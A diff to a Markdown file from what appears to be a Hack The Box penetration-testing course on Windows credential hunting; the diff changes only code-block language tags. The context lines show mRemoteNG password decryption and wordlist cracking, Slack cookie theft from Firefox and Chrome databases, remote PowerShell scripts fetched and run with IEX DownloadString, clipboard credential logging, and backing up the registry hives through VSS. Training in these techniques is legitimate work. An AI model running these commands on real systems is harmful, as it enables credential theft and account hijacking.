@@ -59,8 +59,7 @@ We will also find typical applications such as Office, remote management systems
 
 #### Identifying Common Applications
 
-```
-        cmd
+```bat
 C:\>dir "C:\Program Files"
  Volume in drive C has no label.
  Volume Serial Number is 900E-A7ED
@@ -85,8 +84,7 @@ An alternative is to use PowerShell and read the Windows registry to collect mor
 
 #### Get Installed Programs via PowerShell & Registry Keys
 
-```
-        powershell
+```powershell
 PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
 PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
 PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
@@ -114,8 +112,7 @@ By default, the configuration file is located in `%USERPROFILE%\APPDATA\Roaming\
 
 #### Discover mRemoteNG Configuration Files
 
-```
-        powershell
+```powershell
 PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG
 
     Directory: C:\Users\julio\AppData\Roaming\mRemoteNG
@@ -131,8 +128,7 @@ Let's look at the contents of the `confCons.xml` file.
 
 #### mRemoteNG Configuration File - confCons.xml
 
-```
-        XML
+```xml
 <?XML version="1.0" encoding="utf-8"?>
 <mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
     <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
@@ -146,8 +142,7 @@ As mentioned previously, if the user didn't set a custom master password, we can
 
 #### Decrypt the Password with mremoteng\_decrypt
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 
 
 Password: ASDki230kasd09fk233aDA
@@ -157,8 +152,7 @@ Now let's look at an encrypted configuration file with a custom password. For th
 
 #### mRemoteNG Configuration File - confCons.xml
 
-```
-        XML
+```xml
 <?XML version="1.0" encoding="utf-8"?>
 <mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="1ZR9DpX3eXumopcnjhTQ7e78u+SXqyxDmv2jebJg09pg55kBFW+wK1e5bvsRshxuZ7yvteMgmfMW5eUzU4NG" ConfVersion="2.6">
     <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="False" 
@@ -171,8 +165,7 @@ If we attempt to decrypt the `Password` attribute from the node `RDP_Domain`, we
 
 #### Attempt to Decrypt the Password with a Custom Password
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="
 
 Traceback (most recent call last):
@@ -191,8 +184,7 @@ If we use the custom password, we can decrypt it.
 
 #### Decrypt the Password with mremoteng\_decrypt and a Custom Password
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin
 
 Password: ASDki230kasd09fk233aDA
@@ -202,8 +194,7 @@ In case we want to attempt to crack the password, we can modify the script to tr
 
 #### For Loop to Crack the Master Password with mremoteng\_decrypt
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
                               
 Spring2017
@@ -238,8 +229,7 @@ Firefox saves the cookies in an SQLite database in a file named `cookies.sqlite`
 
 #### Copy Firefox Cookies Database
 
-```
-        powershell
+```powershell
 PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
 ```
 
@@ -247,8 +237,7 @@ We can copy the file to our machine and use the Python script [cookieextractor.p
 
 #### Extract Slack Cookie from Firefox Cookies Database
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
 
 (201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)
@@ -286,8 +275,7 @@ Let's use [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1
 
 #### PowerShell Script - Invoke-SharpChromium
 
-```
-        powershell
+```powershell
 PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
 arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
 PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
@@ -314,8 +302,7 @@ We can modify the code of `SharpChromium` or copy the cookie file to where Sharp
 
 #### Copy Cookies to SharpChromium Expected Location
 
-```
-        powershell
+```powershell
 PS C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
 ```
 
@@ -323,8 +310,7 @@ We can now use Invoke-SharpChromium again to get a list of cookies in JSON forma
 
 #### Invoke-SharpChromium Cookies Extraction
 
-```
-        powershell
+```powershell
 PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
 
 [*] Beginning Google Chrome extraction.
@@ -385,8 +371,7 @@ We can use the [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboar
 
 #### Monitor the Clipboard with PowerShell
 
-```
-        powershell
+```powershell
 PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
 PS C:\htb> Invoke-ClipboardLogger
 ```
@@ -395,8 +380,7 @@ The script will start to monitor for entries in the clipboard and present them i
 
 #### Capture Credentials from the Clipboard with Invoke-ClipboardLogger
 
-```
-        powershell
+```powershell
 PS C:\htb> Invoke-ClipboardLogger
 
 https://portal.azure.com
@@ -440,8 +424,7 @@ We first need to create and initialize the location where our backup will be sav
 
 #### restic - Initialize Backup Directory
 
-```
-        powershell
+```powershell
 PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init
 
     Directory: E:\
@@ -462,8 +445,7 @@ Then we can create our first backup.
 
 #### restic - Back up a Directory
 
-```
-        powershell
+```powershell
 PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
 PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder
 
@@ -483,8 +465,7 @@ If we want to back up a directory such as `C:\Windows`, which has some files act
 
 #### restic - Back up a Directory with VSS
 
-```
-        powershell
+```powershell
 PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
 
 repository fdb2e6dd opened successfully, password is correct
@@ -508,8 +489,7 @@ We can also check which backups are saved in the repository using the `snapshot`
 
 #### restic - Check Backups Saved in a Repository
 
-```
-        powershell
+```powershell
 PS C:\htb> restic.exe -r E:\restic2\ snapshots
 
 repository fdb2e6dd opened successfully, password is correct
@@ -526,8 +506,7 @@ We can restore a backup using the ID.
 
 #### restic - Restore a Backup with ID
 
-```
-        powershell
+```powershell
 PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
 
 repository fdb2e6dd opened successfully, password is correct
